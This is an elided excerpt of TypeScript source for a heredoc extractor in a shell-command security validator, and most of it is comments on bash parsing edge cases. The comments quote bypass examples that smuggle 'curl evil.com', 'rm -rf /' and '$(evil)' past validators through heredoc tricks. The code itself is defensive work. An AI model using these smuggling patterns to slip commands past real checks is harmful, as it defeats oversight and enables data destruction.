 ...
 *     <<'\EOF' â†?delimiter is \EOF (with backslash)
 *     <<'EOF'  â†?delimiter is EOF
 ...
 *     <<\EOF â†?delimiter is EOF (backslash consumed as escape)
 *     <<EOF  â†?delimiter is EOF (plain)
 *
...
export function extractHeredocs(
  ...
  // 1. $'...' or $"..." (ANSI-C / locale quoting â€?our quote tracker
  ...
  // a matching `))` â€?we can't reliably distinguish arithmetic `<<` from
  ...
  if (firstHeredocPos > 0) {
    ...
    // Count (( and )) occurrences â€?if unbalanced, `<<` may be arithmetic
  ...
  // top-level heredoc, hiding $(evil) from validators â€?even though in bash,
  ...
  // re-scanned from position 0 on every match â€?O(nÂ²) when the heredoc body
  ...
  //
  //   Quote state (was isInsideQuotedString) is COMMENT-BLIND â€?it never sees
  ...
  //   equivalently, any physical `\n` clears comment state â€?including `\n`
  ...
  // report the `<<` as unquoted and EXTRACT it â€?hiding content from security
  ...
  // over-eagerness only affects the comment check â€?causing SKIPS (safe
  ...
  while ((match = heredocStartPattern.exec(command)) !== null) {
    ...
    // In bash, `# <<EOF` is a comment â€?extracting it would hide commands on
    ...
    // In bash, `\<<EOF` is NOT a heredoc â€?`\<` is a literal `<`, then `<EOF`
    ...
    // `<<` inside a heredoc body is just text â€?it's not a nested heredoc
    ...
    // Example: <<"EO F" â€?regex captures "EO", misses closing ", delimiter
    ...
    // expansion in the heredoc body â€?content is literal text. Unquoted
    ...
    // IMPORTANT: Only match bash's actual metacharacters â€?space (0x20),
    ...
    // line â€?bash waits for the quote to close before starting to read the
    ...
    //   - Bash: waits for `'` to close â†?logical line is
    //     `echo <<'EOF' '${}\n' ; curl evil.com` â†?heredoc body = `EOF`
    //   - Our old code: indexOf('\n') finds the quoted newline â†?body starts
    //     at `' ; curl evil.com\nEOF` â†?curl swallowed into placeholder â†?
    ...
    let firstNewlineOffset = -1
    {
      ...
      // We start with clean quote state â€?advanceScan already rejected the
      ...
      // If we ended while still inside a quote, the logical line never ends â€?
    ...
    // `\<newline>` joins lines BEFORE heredoc parsing â€?so:
    //   cat <<'EOF' && \
    //   rm -rf /
    //   content
    //   EOF
    ...
    if (trailingBackslashes % 2 === 1) {
      // Odd number of trailing backslashes â†?last one escapes the newline
      // â†?this is a line continuation. Our heredoc-before-continuation order
    ...
    for (let i = 0; i < contentLines.length; i++) {
      ...
      if (
        ...
        if (/^[)}`|&;(<>]$/.test(charAfterDelimiter)) {
          // Shell metacharacter or substitution closer after delimiter â€?
    ...
    if (options?.quotedOnly && !isQuotedOrEscaped) {
      ...
      if (closingLineIndex === -1) {
        // No closing delimiter â€?in bash, heredoc body extends to end of
